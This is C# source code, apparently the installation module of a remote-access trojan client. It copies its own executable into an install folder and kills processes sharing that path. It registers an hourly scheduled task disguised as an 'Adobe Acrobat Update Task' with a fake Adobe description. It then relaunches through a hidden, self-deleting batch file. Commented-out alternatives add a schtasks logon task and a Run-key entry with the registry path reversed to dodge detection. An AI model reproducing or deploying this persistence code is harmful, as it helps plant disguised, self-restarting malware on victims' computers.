using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using Microsoft.Win32.TaskScheduler;
using System.Diagnostics;
using System.IO;
using System.Threading;


namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            try
            {
                FileInfo installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
                string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
                if (currentProcess != installPath.FullName) //check if payload is running from installation path
                {

                    foreach (Process P in Process.GetProcesses()) //kill any process which shares same path
                    {
                        try
                        {
                            if (P.MainModule.FileName == installPath.FullName)
                                P.Kill();
                        }
                        catch { }
                    }

                    if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
                    {
                        /*
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd",
                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                        });
                        */
                        // Get the service on the local machine
                        TaskService ts = new TaskService();
                        // Create a new task definition and assign properties
                        TaskDefinition td = ts.NewTask();
                        td.RegistrationInfo.Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
                        // Create a trigger that will fire the task at this time every other day
                        //td.Triggers.Add(new DailyTrigger { DaysInterval = 1 });
                        DailyTrigger dt = (DailyTrigger)td.Triggers.Add(new DailyTrigger { DaysInterval = 1 });
                        //设置任务起始时间
                        dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 08:30:00"));
                        //设置重复任务间隔时间
                        dt.Repetition.Interval = TimeSpan.FromHours(1);
                        // Create an action that will launch Notepad whenever the trigger fires
                        td.Actions.Add(new ExecAction(installPath.FullName, "", null));
                        // Register the task in the root folder
                        ts.RootFolder.RegisterTaskDefinition(@"Adobe Acrobat Update Task", td);
                    }
                    else
                    {
                        //using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
                        //{
                        //    key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
                        //}
                        TaskService ts = new TaskService();
                        TaskDefinition td = ts.NewTask();
                        td.RegistrationInfo.Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
                        DailyTrigger dt = (DailyTrigger)td.Triggers.Add(new DailyTrigger { DaysInterval = 1 });
                        dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 08:30:00"));
                        dt.Repetition.Interval = TimeSpan.FromHours(1);
                        td.Actions.Add(new ExecAction(installPath.FullName, "", null));
                        ts.RootFolder.RegisterTaskDefinition(@"Adobe Acrobat Update Task", td);
                    }

                    FileStream fs;
                    if (File.Exists(installPath.FullName))
                    {
                        File.Delete(installPath.FullName);
                        Thread.Sleep(1000);
                    }
                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(currentProcess);
                    fs.Write(clientExe, 0, clientExe.Length);

                    Methods.ClientOnExit();

                    string batch = Path.GetTempFileName() + ".bat";
                    using (StreamWriter sw = new StreamWriter(batch))
                    {
                        sw.WriteLine("@echo off");
                        sw.WriteLine("timeout 3 > NUL");
                        sw.WriteLine("START " + "\"" + "\" " + "\"" + installPath.FullName + "\"");
                        sw.WriteLine("CD " + Path.GetTempPath());
                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                    }

                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = batch,
                        CreateNoWindow = true,
                        ErrorDialog = false,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });

                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }

    }
}
